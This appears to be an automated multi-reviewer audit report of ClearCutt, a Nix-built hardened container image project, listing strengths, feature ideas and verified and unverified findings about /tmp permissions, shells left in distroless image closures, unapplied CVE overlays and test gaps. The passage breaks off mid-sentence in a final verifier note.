summary: Multi-dimension review of ClearCutt: Nix, hardening, supply chain, DX, showcase, hygiene — with adversarial verification
logs: Fanning out 6 dimension reviewers across the repo
Running completeness critic over all dimension results

strengths: Flake hygiene is genuinely strong: a single pinned input (core/flake.nix:6-8, locked to rev a0991c8 in core/flake.lock), no flake-utils dependency (hand-rolled `forAllSystems = nixpkgs.lib.genAttrs systems`), zero IFD anywhere in core/lib/, and deterministic image output (no `created` override on dockerTools.buildLayeredImage, so images get the reproducible epoch timestamp by default).

The per-CVE overlay barrel is elegant, sound Nix (core/overlays/cve-remediation.nix): one self-contained overlay file per CVE under core/overlays/cve/, discovered with `builtins.readDir` (pure under flakes), with documented alphabetical conflict semantics ('later-loaded file wins') and a machine-readable .evidence.json sitting next to each overlay (core/overlays/cve/cve-2026-7210-python315.{nix,evidence.json}). Atomic writes and single-file rollback in core/scripts/cve-draft-agent.py:180-219 back the design claims.

The registry abstraction (core/lib/registry.nix) is well-factored: candidate-path fallback resolution via `getPkg [ ["zulu21"] ["temurin-bin-21"] ["jdk21"] ... ]`, per-tier overrides (`slimOverride`/`distrolessOverride` for dotnet), and `omitInProduction` correctly keeps compiler toolchains (go/rust/cc) out of slim/distroless images — confirmed by published SBOMs and run-smoke-tests.sh negative assertions (cargo/gcc absent in slim).

Fork modularity is real, not aspirational: product identity is isolated in core/lib/platform-metadata.nix and consumed everywhere with `platformMetadata.x or "default"` fallbacks; CLI-scaffolded extension seams (core/lib/runtime-extensions.nix merged via `lib.recursiveUpdate`, core/lib/service-extensions.nix consumed as data) let a fork add runtimes/services without touching flake internals.

`lib.graftOntoBase` (core/flake.nix:197-262) is a great downstream story — graft a ClearCutt runtime onto a mandated enterprise base (`fromImage`), with runtime-string parsing (`java21`, `python3.15`), strict argument hygiene via filterAttrs, and a worked example with clearly-marked pinned-digest placeholders in examples/base-image-overlay/flake.nix.

Security engineering depth in the surrounding tooling: pipeline.sh:135-157 hard-refuses to mint local cosign keys under GITHUB_ACTIONS; core/scripts/agent-sandbox.sh runs LLM-touched builds under `env -i` with a throwaway HOME, and core/tests/verify.sh actually tests that isolation; cve-draft-agent.py enforces a deny-list of dangerous override phases (DANGEROUS_OVERRIDE_ATTRS) and rejects comment-only 'fixes' before any LLM output is accepted.

The G2 closure-diff gate (core/tests/verify-closure-diff.sh) is a rarely-seen control done carefully: boundary-safe ERE matching (explicitly avoids 'core' matching coreutils/corepack), explained-dependency-cascade logic, and verify.sh even asserts the gate rejects an unexplained package addition (verify.sh:677-684).

Service images have real contracts: service-image-contract.sh asserts OCI User/WorkingDir/ExposedPorts/Entrypoint/labels and rootless dataDir ownership (10001:10001, not world-writable) straight from the layer tars, and buildServiceImage's extraCommands/fakeRootCommands split in core/lib/build-fleet.nix:339-352 correctly uses the only mechanism (in-builder tar under fakeroot) that preserves ownership.
wowIdeas: Make the 'zero-shell distroless' claim machine-enforced and publicly verifiable: a `checks.<system>.distroless-purity` flake check that walks each distroless image's store closure (the logic already exists in core/tests/nix-store-closure-from-image.py) and fails on bash/coreutils/shell paths — then publish the pass/fail as a badge per image on the Astro catalog. No competitor (chainguard/distroless) exposes closure-level proofs like this.

jlink-minimized Java tier: add a `clearcutt runtime minimize` command that runs jdeps over an app jar and emits a registry `distrolessOverride` built with `pkgs.jre_minimal { modules = [...] }`. It would shrink java distroless from a full GUI'd JDK closure (gtk/cups/alsa today) to a ~40-60MB headless runtime and turns the current biggest weakness into the headline demo.

Publish the per-CVE overlay + evidence pairs as a subscribable remediation feed: the one-file-per-CVE format under core/overlays/cve/ with paired .evidence.json is already perfectly cherry-pickable — expose a JSON/RSS feed from the site so forks can `clearcutt remediation pull CVE-2026-XXXX` and import the exact validated overlay file with its evidence chain. Across forks this becomes a community remediation exchange, which is a genuinely novel open-source story.

Hermetic pipeline via `apps`: expose `apps.<system>.pipeline` wrapping core/pipeline/pipeline.sh with syft/grype/skopeo/cosign pinned from the same flake.lock, so `nix run .#pipeline -- java21-distroless` reproduces the release gate bit-for-bit on any machine — eliminating the current dependence on whatever scanner versions happen to be on PATH and making 'reproduce our evidence locally' a one-liner in the README.

Assemble the multi-arch OCI image index in Nix instead of `crane index append` in CI: a small derivation that combines the per-arch buildLayeredImage outputs into an OCI layout makes even the manifest list reproducible from the lock, closing the last non-Nix step between `nix build` and the signed artifact — a strong differentiator for the supply-chain story (SLSA provenance could then attest a fully Nix-derived subject).

verifiedFindings.title: Every image ships a root-owned, non-writable /tmp — the `chmod 1777` is silently destroyed by Nix store canonicalization, and the postgres service image cannot start because of it
verifiedFindings.detail: core/lib/build-fleet.nix builds /tmp as a store path: `tmpDir = pkgs.runCommand "cc-tmp-dir" {} ''mkdir -p $out/tmp; chmod 1777 $out/tmp''`. Nix store canonicalization strips write/sticky bits — empirically verified by building this exact derivation against the project's pinned nixpkgs: the result is `dr-xr-xr-x` (0555). nixpkgs' stream_layered_image.py packs store paths with `tar.gettarinfo(filename)` (on-disk modes preserved), and the customisation layer's symlinkJoin recreates the dir at 0755 root:root — either way /tmp is unwritable by the image's `User = "10001:10001"`. Meanwhile baseEnv bakes `"TMPDIR=/tmp"` into every image (build-fleet.nix:101), actively pointing all workloads at the broken dir, and the postgres entrypoint hardcodes `postgres ... -k /tmp` (build-fleet.nix:173) for its Unix socket, so the postgres16 service image fails at startup with a lock-file permission error. Nothing catches this: structure tests only assert `/tmp` `shouldExist: true`, and service smoke tests run `--command-only` (`postgres --version`), never the entrypoint.
verifiedFindings.recommendation: Drop `tmpDir` from `baseContents` and create /tmp in `extraCommands` instead — `mkdir -p tmp && chmod 1777 tmp` — which is packed inside the builder before canonicalization (the same mechanism that already makes `prepareDataDirs`'s `chmod 0750` and `fakeRootCommands`' chown work). Then strengthen core/tests/structure-test-*.yaml to assert /tmp permissions (`permissions: 'dtrwxrwxrwx'`) and add a service smoke path that actually boots the postgres entrypoint once.

verdict.note: Every factual claim checks out. (1) core/lib/build-fleet.nix:39-42 builds tmpDir exactly as quoted, and I reproduced the canonicalization empirically against the project's pinned nixpkgs (core/flake.nix -> nixpkgs-unstable, locked rev): the built store path's tmp dir is dr-xr-xr-x (0555) — chmod 1777 silently destroyed. (2) In the pinned nixpkgs (pkgs/build-support/docker/default.nix:1070-1100), the customisation layer symlinkJoins contents (lndir recreates the dir at 0755), then fakeroot-tars it with on-disk modes, so the image's /tmp is 0755 root:root; stream_layered_image.py packs store layers with tar.gettarinfo (modes preserved) — either way unwritable by the configured User 10001:10001. (3) baseEnv bakes TMPDIR=/tmp (line 101) into every base and service image. (4) The postgres entrypoint hardcodes `-k /tmp` (line 172, within the cited range), so postgres cannot create its socket lock file as uid 10001 and the postgres16 image fails on a plain `docker run`. (5) No test catches it: structure tests (distroless lines 20-22, and slim) only assert /tmp shouldExist; core/tests/service-image-contract.sh passes --command-only for postgres16 (smoke = `postgres --version` etc. per clearcutt.yaml:104-107), and even without that flag, cli/internal/commands/service.go:634-646 defines a functional boot profile only for the valkey template (which doesn't need /tmp), so the postgres entrypoint is never booted anywhere in CI. (6) The recommended fix mechanism is sound — extraCommands/fakeRootCommands run inside the customisation-layer builder before canonicalization, the same path that makes prepareDataDirs' chmod 0750 and the chown work. Partial mitigations exist but don't refute the finding: examples/oci-deployment/docker-compose.yml mounts tmpfs /tmp:mode=1777, and the k8s/openshift examples mount emptyDir over /tmp — but those cover only app-image deployments, not the postgres service image (examples/service-images/README.md documents `docker` smoke with no /tmp mount), and the in-image 1777 intent still silently fails. Severity nuance: the postgres16 service is lifecycle `preview` with productionAllowed: false, and documented app deployments mask the issue, so "critical" is arguable — "high" may be fairer — but the core defect (DOA service image, broken TMPDIR in every image, zero test coverage) is real as stated.

verifiedFindings.title: 'Distroless' images contain bash (and for Java, a full GUI/print/sound stack) in their store closures — the zero-shell promise is only enforced at FHS paths
verifiedFindings.detail: The published v0.14.1 SBOMs show java21-distroless contains `bash`, `coreutils`, `gtk+3`, `cairo`, `cups`, `alsa-lib`, `avahi`, `dbus`, `fontconfig` (110 packages — the non-headless OpenJDK closure); node22-distroless contains `bash`, `coreutils`, `gnugrep`; python3.13-distroless contains `bash`. So a fully functional shell exists at `/nix/store/<hash>-bash-*/bin/bash` inside images marketed as 'Distroless Zero-Utility'. All existing gates check only FHS paths: verify.sh's `problematic_paths=("bin/sh" "bin/bash" ...)` and structure-test-distroless.yaml's `path: '/bin/bash' shouldExist: false` pass while the shell remains reachable by store path. The Java tier additionally carries the JDK's GUI dependency tree — exactly the CVE surface (cups, gtk, dbus) this product exists to eliminate, and a large size cost.
verifiedFindings.recommendation: Use headless/minimal runtimes for production tiers in core/lib/registry.nix: add `distrolessOverride`/`slimOverride` entries for Java using `jdk21_headless`/`openjdk21_headless` (or a jlink-built `jre_minimal`), and consider `python3Minimal` for python distroless. Then make the claim machine-enforced: extend test_distroless_boundaries to walk `/nix/store/*/bin/{sh,bash,ash}` in the extracted layers (tests/nix-store-closure-from-image.py already extracts store roots), and fail the gate when a shell or coreutils path appears in any distroless closure.

verdict.note: Every cited fact checks out. core/lib/registry.nix:45-58 selects a full non-headless JDK (zulu21/temurin/jdk21) with no distrolessOverride (the override mechanism exists and is used for .NET at lines 116/122, so the fix is actionable as described). The v0.14.1 SBOMs are syft-1.44.0 scans of the built docker-archive (core/pipeline/pipeline.sh:225), so they reflect actual image contents: java21-distroless-amd64 has exactly 110 packages including bash, coreutils, gtk+3, cairo, cups, alsa-lib, avahi, dbus, fontconfig; node22-distroless has bash/coreutils/gnugrep; python3.13-distroless has bash. Syft's binary cataloger confirms the executable itself is present ("acquired package info from the following paths: /nix/store/gik3rh1vz2jlgnifb9dh6vc6sxwwz9jj-bash-5.3p9/bin/bash"), and that exact path is published on the site. All gates are FHS-only: verify.sh's problematic_paths (line 495, within cited 493-515) and structure-test-distroless.yaml:32-43 check /bin and /usr/bin only; run-smoke-tests.sh resolves `sh` via PATH which excludes store bin dirs; no SBOM deny-list exists in pr-gate.yml/release.yml. The repo's own docs (.agents/context/architecture.md:16) promise "exactly zero interactive shells or coreutils" in distroless, which the published SBOMs contradict. High severity is justified: the zero-shell guarantee is the product's core differentiator, a working bash sits at a publicly disclosed store path inside every cited distroless image, and the Java tier carries the full GUI/print/sound dependency tree (cups, gtk, dbus, avahi) as added CVE surface. nix-store-closure-from-image.py exists at core/tests/ and supports the recommended enforcement approach.

verifiedFindings.title: CVE remediation overlay is not applied on two of the three public Nix consumption surfaces — overlays.default and lib.mkHardenedShell hand out unpatched runtimes
verifiedFindings.detail: The flake's own images get `overlays = [ (import ./overlays/cve-remediation.nix) ]` (flake.nix:36-38), and `graftOntoBase` re-applies it (flake.nix:214-216). But `lib.mkHardenedShell` imports nixpkgs bare: `pkgs = import nixpkgs { inherit system; };` — no cve-remediation overlay and no `allowUnfree` (which the project's own comment at flake.nix:29 says JDKs need). And `overlays.default` resolves the registry against `prev` (`helpers.overlay` in nix-native.nix returns attrs built from un-overlaid `pkgs = prev`), so a downstream applying ClearCutt's overlay to stock nixpkgs gets e.g. `clearcuttPython315` WITHOUT the CVE-2026-7210 bump that core/overlays/cve/cve-2026-7210-python315.nix applies to the flake's own images. The cve-remediation overlay is also not exported as a flake output at all, so downstreams cannot even opt in. The evidence-backed remediation story silently stops at the image boundary.
verifiedFindings.recommendation: In `lib.mkHardenedShell`, import nixpkgs with the same `config.allowUnfree` and `overlays = [ (import ./overlays/cve-remediation.nix) ]` used by `perSystem` and `graftOntoBase`. Export the remediation overlay (`overlays.cveRemediation = import ./overlays/cve-remediation.nix;`) and compose it into `overlays.default` (apply cve overlay first, then resolve registry attrs from `final`), documenting the ordering. Add a verify.sh assertion that a remediated package attr resolved through overlays.default carries the patched version.

verdict.note: Verified against /Users/eddie/Development/clearcutt-images/core/flake.nix, core/lib/nix-native.nix, core/lib/registry.nix, core/overlays/cve-remediation.nix, core/overlays/cve/cve-2026-7210-python315.nix, and core/tests/verify.sh. Every load-bearing claim holds: the cve-remediation overlay is applied at exactly two sites (perSystem hostPkgs, flake.nix:36-38, and graftOntoBase, flake.nix:214-216); lib.mkHardenedShell (flake.nix:192) imports nixpkgs bare with no overlay and no allowUnfree, despite the project's own comment at flake.nix:29-34 saying allowUnfree is required for JDKs; overlays.default (flake.nix:182-186) passes pkgs = prev into nix-native.nix, whose overlay (line 45) returns attrs prebuilt from that un-overlaid pkgs, so clearcuttPython315 resolves prev.python315 without the CVE-2026-7210 override (and resolving from prev also means downstream overrides on final never propagate). No flake output exports the remediation overlay (outputs are only packages, devShells, overlays.default, lib). I searched for mitigating controls and found none: verify.sh's test_native_nix_integration only asserts the overlay attrs evaluate non-null and a mkHardenedShell drvPath exists — no version assertion; `clearcutt remediation validate-overlays` validates overlay file syntax/evidence, not export composition; docs never instruct downstreams to compose the cve overlay; the scan workflows cover images only. Two minor overstatements that do not change the verdict: (a) "downstreams cannot even opt in" is slightly too strong — they could import overlays/cve-remediation.nix directly from the flake's source tree, just not via any supported output; (b) the allowUnfree gap is asserted from the repo's own comment, and verify.sh successfully instantiates a java21 mkHardenedShell without allowUnfree, so its practical breakage is unproven. Severity high is justified in context: nix-native.nix:44 explicitly promises downstreams a "verified package matrix", the product's stated purpose is CVE-aware runtimes, and the failure is silent and structural — every current and future remediation is skipped on two of the three public consumption surfaces (today's concrete delta is the single Python 3.15 CVE-2026-7210 bump).

unverifiedFindings.title: removeNpm works only by accident of nixpkgs internals — a future nodejs refactor silently re-ships npm in production tiers with no test to catch it
unverifiedFindings.detail: `removeNpm` symlinkJoins the `nodejs_22` attr and `rm`s `bin/npm`, `bin/npx`, `bin/corepack`, `lib/node_modules/{npm,corepack}`. This currently yields an npm-free closure (verified: v0.14.1 node22-slim SBOM contains only `nodejs-slim 22.22.3`, no npm) — but ONLY because the pinned nixpkgs defines `nodejs_22 = symlinkJoin { paths = [ nodejs-slim nodejs-slim.npm nodejs-slim.corepack ]; }` and lndir duplicates the inner symlinks, so deleting the npm symlinks drops the npm output from the closure. With a monolithic nodejs derivation (e.g. the registry's own fallback candidate `nodejs-22_x`, or older/other nixpkgs revisions where npm lives inside `$out`), the symlinkJoin's surviving symlinks still reference the full npm-bearing store path, and `slim`/`distroless` images would ship npm at `/nix/store/...-nodejs-22.x/bin/npm` while the comment claims 'the production tiers ship the bare `node` binary only'. No structure test or smoke test asserts npm/corepack absence.
unverifiedFindings.recommendation: Resolve `nodejs-slim_22`/`nodejs-slim_24` directly in the candidate list (`getPkg [ [ "nodejs-slim_22" ] [ "nodejs_22" ] ... ]`) — it exists in the pinned nixpkgs and is structurally npm-free — keeping removeNpm only as a fallback transformation. Add `fileExistenceTests` for `/bin/npm`, `/bin/npx`, `/bin/corepack` (shouldExist: false) to the slim structure test, and a closure-level npm absence assertion alongside the distroless shell check.

unverifiedFindings.title: perSystem is evaluated twice per system and registry.nix is instantiated three times per pkgs — avoidable eval-time redundancy in a 4-system matrix
unverifiedFindings.detail: Flake outputs call `perSystem` independently for packages and devShells: `packages = (forLinuxSystems (system: let p = perSystem system; in ...)) // ...` and `devShells = forAllSystems (system: (perSystem system).devShells);`. Nix does not memoize function application, so each system pays for `import nixpkgs { ... overlays = [ cve-remediation ] }` plus full registry/matrix construction twice. Separately, `import ./registry.nix { inherit pkgs; }` is performed three times against the same pkgs (flake.nix:47, build-fleet.nix:9, nix-native.nix:7), re-running every `getPkg` candidate probe each time. None of this is incorrect, but for a showcase flake it doubles eval cost and memory for `nix flake show`/CI evaluation.
unverifiedFindings.recommendation: Bind the per-system evaluation once: `let evaluated = forAllSystems perSystem; in { packages = nixpkgs.lib.genAttrs linuxSystems (s: evaluated.${s}.imagePackages // evaluated.${s}.nativePackages) // ...; devShells = nixpkgs.lib.mapAttrs (_: v: v.devShells) evaluated; }`. Thread the already-imported `registry` into build-fleet.nix and nix-native.nix as an argument (`import ./lib/build-fleet.nix { inherit pkgs registry; }`) with the current self-import kept as a default.

unverifiedFindings.title: Two sources of truth for the runtime matrix with live drift: registry.nix builds python 3.13/3.14 that clearcutt.yaml no longer certifies
unverifiedFindings.detail: core/lib/registry.nix declares python `"3.13"`, `"3.14"`, and `"3.15"`, and core/flake.nix derives its package matrix from the registry (`versions = builtins.mapAttrs (lang: spec: builtins.attrNames spec.versions) registry.languages`), so `python3.13-slim`/`python3.14-*` are buildable flake outputs. But clearcutt.yaml's `matrix.languages` lists only `python3.15` — the governance config, release matrix, and admission story no longer cover two runtime lines the flake still exposes (and which prior releases shipped: v0.14.1 SBOMs include python3.13/3.14 images). For a kit whose pitch is 'declare the fleet in clearcutt.yaml', the Nix registry silently disagreeing with the fleet file undermines the evidence chain: a fork can `nix build .#python3.13-distroless` an image that no policy, scan cadence, or catalog entry governs.
unverifiedFindings.recommendation: Make clearcutt.yaml the single source: either have `clearcutt runtime scaffold` (which already owns runtime-extensions.nix) generate/prune the built-in version set, or add a CI consistency gate that diffs `registry.languages` against `matrix.languages` and fails on orphaned runtime lines. At minimum delete the python 3.13/3.14 entries or re-add them to the fleet matrix.

unverifiedFindings.title: The remediation 'semantic cache' can never hit in CI, and the tracked core/overlays/patch-cache.json is dead
unverifiedFindings.detail: cve-draft-agent.py defines `PATCH_CACHE_PATH = os.path.join("build-outputs", "remediation", "patch-cache.json")` — a path under `build-outputs/`, which .gitignore excludes (`build-outputs/*`, `core/build-outputs/*`) and which .github/workflows/cve-patch-agent.yml never persists (its only caches are Go modules and the Nix store). So the elaborate cache fast-path (check_patch_cache → validate → rebuild → branch, ~50 lines at lines 934-981) starts from an empty cache on every ephemeral runner and is effectively dead code in CI. Meanwhile the repo tracks `core/overlays/patch-cache.json` (`{"entries": {}, "schema": 2}`), a path no code reads — grep shows the only `patch-cache` references are the agent (build-outputs path) and its tests (tmpdir path). It looks like the cache was moved out of overlays/ without deleting the old file.
unverifiedFindings.recommendation: Pick one: (a) persist the real cache across runs with actions/cache keyed on grype DB epoch + flake.lock rev, or (b) move PATCH_CACHE_PATH back to the tracked overlays/patch-cache.json so verified recipes land in the PR alongside the overlay (the schema-2 format is already commit-friendly). Either way, delete whichever file is left dead.

unverifiedFindings.title: k8s-roundtrip.sh crashes with 'command not found' on its cluster-reuse path: log_warn is called but never defined
unverifiedFindings.detail: The script defines `log_info`, `log_success`, and `log_error` only, but line 45 runs `log_warn "Kind cluster ${CLUSTER_NAME} already exists. Reusing..."`. Under `set -euo pipefail`, the undefined function exits the script with status 127 — precisely in the branch meant to gracefully reuse an existing cluster, so every second invocation of the round-trip test on the same machine dies before doing anything. (Every other script in core/tests/ and core/scripts/ defines log_warn; this is the one omission.)
unverifiedFindings.recommendation: Add `log_warn() { echo -e "${YELLOW}[ClearCutt K8s] ⚠ $1${RESET}"; }` next to the other loggers in core/tests/k8s-roundtrip.sh, and run shellcheck over core/tests/ in CI (SC2218/command-not-found class issues are exactly what it catches).

unverifiedFindings.title: Structure tests and smoke runner hardcode upstream branding, breaking the fork story the platform metadata layer exists to serve
unverifiedFindings.detail: build-fleet.nix writes the passwd GECOS from fork metadata: `${username}:x:${uid}:${gid}:${productName} Secure App User:...`, but both structure tests assert the literal `".*appuser:x:10001:10001:ClearCutt Secure App User:/app:/sbin/nologin.*"` — a fork that sets `branding.productName` in clearcutt.yaml fails its own structure gates. Similarly run-smoke-tests.sh hardcodes `IMAGE_TAG=$(echo "clearcutt-${LANG}-${VER}:${TIER}" ...)` while pipeline.sh carefully derives the prefix from platform-metadata.nix (`platform_image_prefix()`, pipeline.sh:74-91). These are the only fork seams in core/ that contradict the otherwise consistent `platformMetadata.x or default` pattern.
unverifiedFindings.recommendation: Have `clearcutt platform init` regenerate the structure-test YAMLs (they are small templates), or relax the GECOS assertion to `appuser:x:10001:10001:.*:/app:/sbin/nologin`. In run-smoke-tests.sh, accept the prefix via `${CLEARCUTT_IMAGE_PREFIX:-clearcutt}` like service-image-contract.sh already does (line 158).

unverifiedFindings.title: Overlay/lib eval checks in verify.sh are impure: they validate against the host's <nixpkgs> channel instead of the locked input
unverifiedFindings.detail: test_native_nix_integration evaluates `pkgs = import <nixpkgs> { overlays = [ flake.overlays.default ]; }` — `<nixpkgs>` resolves via the machine's NIX_PATH/channel, so the overlay is validated against an arbitrary nixpkgs that can differ from core/flake.lock (and the check fails outright on hosts with no channel configured). The repo is otherwise scrupulous about pinning; this is the one eval that escapes the lock.
unverifiedFindings.recommendation: Use the flake's own input: `let flake = builtins.getFlake (toString ./.); pkgs = import flake.inputs.nixpkgs { system = builtins.currentSystem; overlays = [ flake.overlays.default ]; }; in ...`. Same change for the mkHardenedShell drvPath check.

unverifiedFindings.title: Nix polish: impure <nixpkgs> default arg, empty throw messages, no-op rm in extraCommands, and an unimplemented recipe route
unverifiedFindings.detail: Assorted small wrinkles: (1) build-fleet.nix's default `{ pkgs ? import <nixpkgs> {} }` is an impure fallback that fails under pure eval — it is always overridden in practice, so the default is misleading; (2) registry.nix python devExtra uses `getPkg [ [ "python313" ] ] ""` — an empty throw message if the attr is missing; (3) the `rm -f etc/passwd etc/group` in extraCommands is a no-op (extraCommands starts from the symlinkJoin scratch dir; the cp that follows is what does the work — the rm IS needed to replace the lndir symlinks, but the comment-free pairing reads as confusion and deserves a comment); (4) `ALLOWED_RECIPE_ROUTES` includes `"nixpkgs_input_update"` but no resolver or executor implements that route — validate_recipe accepts it from an LLM yet still demands a package-attribute overlay_expression, making the route name a dead misnomer; (5) `__pycache__/`, `*.pyc`, and `.DS_Store` are absent from the repo .gitignore — they are kept out of this checkout only by the maintainer's personal ~/.gitignore_global, so any contributor without a global ignore will stage them (core/tests/__pycache__/ and core/scripts/__pycache__/ already exist on disk).
unverifiedFindings.recommendation: Drop the `<nixpkgs>` default (make pkgs required), give the python devExtra getPkg calls real error strings, comment the rm/cp passwd dance, remove `nixpkgs_input_update` from ALLOWED_RECIPE_ROUTES until implemented, and add `__pycache__/`, `*.pyc`, `.DS_Store` to .gitignore.

unverifiedFindings.title: No flake checks/formatter outputs — the impressive gate suite is invisible to `nix flake check`
unverifiedFindings.detail: The flake exposes only `packages`, `devShells`, `overlays`, and `lib`. All verification lives in bash (core/tests/verify.sh, 765 lines) and is invoked manually or by CI scripts, so `nix flake check` — the first thing a Nix-literate reviewer runs — reports nothing. Pure, fast invariants are already sitting there: registry/matrix eval coherence, overlay attr presence (replacing the impure check in verify.sh:526), structure assertions on image config JSON (config.User/WorkingDir are pure derivation outputs), and nixfmt/statix/deadnix linting of core/lib/.
unverifiedFindings.recommendation: Add `checks.<system>` wiring the cheap eval-level invariants (overlay attrs resolve, registry versions match clearcutt.yaml, cve overlay files parse) plus `formatter = pkgs.nixfmt-rfc-style`, keeping the heavy OCI gates in verify.sh. This is high showcase value for low effort: `nix flake check` becomes a one-command credibility demo.

docs/security-model.md is refreshingly honest: explicit non-claims (no FIPS, overlay images do not inherit the distroless guarantee, service data-dir caveat, CVE-agent drafts are untrusted), and the license boundary (image=NOASSERTION vs recipe=Apache-2.0, security-model.md:39-42) is exactly right and rare to see done correctly.
wowIdeas: Hardening-conformance attestation per digest: pipeline.sh already writes a structured test-results predicate and attaches SBOM/provenance attestations — extend that predicate with the structure-test, shell-absence, RPATH, and setuid-scan results per tier and attach it via the existing cosign v3 bundle flow, then render a 'Hardening verified' badge per image on the Astro catalog. Fix-then-flex the /tmp finding: after moving /tmp into extraCommands, add a 'runs everywhere' demo to docs/demo.md — `docker run` postgres16 standalone with zero flags (currently impossible) plus the same image under readOnlyRootFilesystem with emptyDir — showing the images are hardened AND ergonomic out of the box.

verifiedFindings.title: /tmp ships read-only in every image: chmod 1777 is silently stripped by Nix store canonicalization
verifiedFindings.detail: build-fleet.nix creates /tmp via a contents derivation: `tmpDir = pkgs.runCommand "cc-tmp-dir" {} ''mkdir -p $out/tmp; chmod 1777 $out/tmp''`. Nix store canonicalization strips all mode bits to 0555/0444 — I verified empirically on this machine: building that exact derivation yields `dr-xr-xr-x` for $out/tmp, and the symlinkJoin used by dockerTools' customisation layer recreates it as a root-owned 0755 dir. So every image sets `TMPDIR=/tmp` (baseEnv, line 101) pointing at a directory UID 10001 cannot write. Concrete breakage: the postgres entrypoint hardcodes `-k /tmp` for its unix socket (line 172), so `docker run clearcutt-postgres16` fails on the lock file — and this is never caught because service-image-contract.sh runs postgres16 smoke as `--command-only` (line 18 `command_only="true"`). The structure tests only assert /tmp `shouldExist: true` with no permission check, and the k8s/OpenShift examples mask the bug by mounting emptyDir at /tmp. The comment 'Isolated filesystem workspaces with optimized permissions' is currently false.
verifiedFindings.recommendation: Create /tmp in `extraCommands` exactly like the (working) app-workspace pattern already in the same file: add `mkdir -p tmp && chmod 1777 tmp` next to prepareAppWorkspace (permissions set in extraCommands/fakeRootCommands DO persist into the layer tar — proven by the dataDirs contract test). Delete the dead tmpDir derivation, and add `permissions: 'dtrwxrwxrwx'` assertions for /tmp to both structure-test yamls. Also flip postgres16 smoke to a real startup test so the socket path is exercised.

verdict.note: Every factual claim verified, including empirically. (1) /Users/eddie/Development/clearcutt-images/core/lib/build-fleet.nix lines 39-42, 101, and 172 contain exactly the quoted tmpDir derivation, TMPDIR=/tmp baseEnv entry, and `-k /tmp` postgres socket flag. (2) Rebuilding the exact derivation with nix-build on this machine yields dr-xr-xr-x (0555) for $out/tmp — Nix store canonicalization strips the 1777. (3) Decisively, the actual shipped artifact build-outputs/coreLTS-distroless.tar.gz has `./tmp` recorded in its customisation layer tar as mode 0755 uid=0 gid=0, exactly the "root-owned 0755 dir" the reviewer claimed, unwritable by the configured User 10001:10001. (4) core/tests/service-image-contract.sh line 18 sets command_only="true" for postgres16, and cli/internal/commands/service.go shows the finding actually understates the gap: smoke commands run with --entrypoint overridden, and serviceFunctionalSmokeProfileFor only defines a startup probe for the "valkey" template, so the postgres entrypoint is never executed even without --command-only. (5) Both structure-test yamls assert /tmp shouldExist with no permissions field. (6) I searched for mitigating controls: a `clearcutt conformance run` command does check tmp_writable (conformance.go:95-102) but no CI workflow runs it inside built images; the k8s/OpenShift examples mount emptyDir at /tmp and examples/oci-deployment/docker-compose.yml mounts tmpfs with mode=1777 — these mask rather than fix, confirming the finding. The e2e tests only run hello-world prints that never touch TMPDIR. Caveats on severity: postgres16 is lifecycle "preview" with productionAllowed: false, and all documented deployment paths mount over /tmp, so high vs medium-high is debatable — but for a hardened-image product whose docs (docs/enterprise-adoption.md) advertise writable /tmp, shipping every image with an unwritable baked-in TMPDIR and a service image that cannot start under plain `docker run` justifies high. I did not execute the postgres container itself (requires a Linux nix build), but the failure chain (uid 10001 creating /tmp/.s.PGSQL.5432.lock in a 0755 root-owned dir) is deterministic. The recommendation is sound: app/dataDirs permissions set in extraCommands/fakeRootCommands persist in the customisation layer tar, as the dataDirs contract check in service-image-contract.sh enforces in CI.

verifiedFindings.title: The 'distroless = shell-free' claim is only verified at FHS paths and only for a subset of images; a shell inside /nix/store is invisible to every gate
verifiedFindings.detail: docs/security-model.md claims '`distroless` tier is verified by conformance/certification checks to be shell-free, package-manager-free'. Enforcement reality: (1) every shell/package-manager scan matches only FHS paths — certify's ScanLayerForRuntimeTools switch lists `"bin/sh", "bin/bash", ... "usr/bin/zsh"` and apk/apt/dnf paths; verify.sh problematic_paths is the same list; structure-test-distroless.yaml checks /bin and /usr/bin only. ClearCutt images put ALL payload under /nix/store, so if any language runtime's closure pulls in bash (e.g. a makeWrapper script in a JDK/dotnet derivation), it ships at /nix/store/<hash>-bash-*/bin/bash and no gate notices — the `docker run image sh -c` smoke check also relies on PATH lookup and misses it. (2) Coverage: structure tests, the rootless metadata check, and the RPATH gate run only against coreLTS-slim/coreLTS-distroless (verify.sh lines 325, 383, 465-467); release.yml runs only pipeline.sh (build/SBOM/grype) plus the service contract — the actually-published java/node/python/dotnet distroless artifacts get no shell-absence, UID, or RPATH conformance check at release time.
verifiedFindings.recommendation: Two cheap, high-leverage fixes: (a) extend ScanLayerForRuntimeTools and verify.sh to flag basenames {sh,bash,ash,zsh,dash,busybox} and package managers anywhere in a layer, including nix/store/*/bin/*, with an allowlist for slim/dev; (b) run the (already tier-templated) container-structure-test per matrix target in the release build job — the tarball is already on disk in pipeline.sh, so it is one extra step before the skopeo push, and record it in the existing test-results predicate so the catalog shows per-digest conformance evidence.

verdict.note: Every cited fact checks out. (1) FHS-only scanning confirmed in all four gates: cli/internal/certify/archive.go:252-258 exact-matches only "bin/sh...usr/bin/zsh" and FHS package-manager paths (and misses dash/busybox even there); core/tests/verify.sh:495-499 uses the same FHS list with [-f/-L] checks against the extracted root; core/tests/structure-test-distroless.yaml shell checks are /bin/bash, /bin/sh, /bin|usr/bin/ls|cat only; core/tests/run-smoke-tests.sh runs `docker run ... sh -c` which resolves via the image PATH (core/lib/build-fleet.nix:99 sets PATH to FHS dirs only), so a shell at /nix/store/<hash>-bash/bin/bash would evade all of them. No compensating Nix control exists: zero hits for disallowedReferences/allowedReferences/disallowedRequisites repo-wide, and build-fleet.nix distroless tier merely omits bash/busybox from contents while including the full unconstrained language closure (registry.nix) under /nix/store. (2) Coverage claims confirmed: verify.sh hardcodes coreLTS-slim at lines 325/383 and coreLTS-distroless at 465, structure tests (lines 599-608) run only on those two targets; release.yml's publish-matrix runs `clearcutt fleet publish-target` which (fleet.go:216) just invokes core/pipeline/pipeline.sh (build, syft SBOM, grype, sign/push — no structure/shell/UID/RPATH checks), plus service-image-contract.sh at release.yml:321 for services only. docs/security-model.md:19 makes exactly the quoted "verified... shell-free" claim. One nuance the finding omits: .github/workflows/e2e-runtimes.yml does run `clearcutt certify` per language (java/node/python/dotnet/etc.) against each distroless base, including a non-root UID check — but it triggers only on PRs/dispatch (not at release), and its shell scan is the same FHS-blind ScanLayerForRuntimeTools, so the central blind spot stands. Caveat on severity: the bash-in-closure scenario is plausible (e.g. wrapper scripts in dotnet/JDK derivations) but not demonstrated in any currently published image — 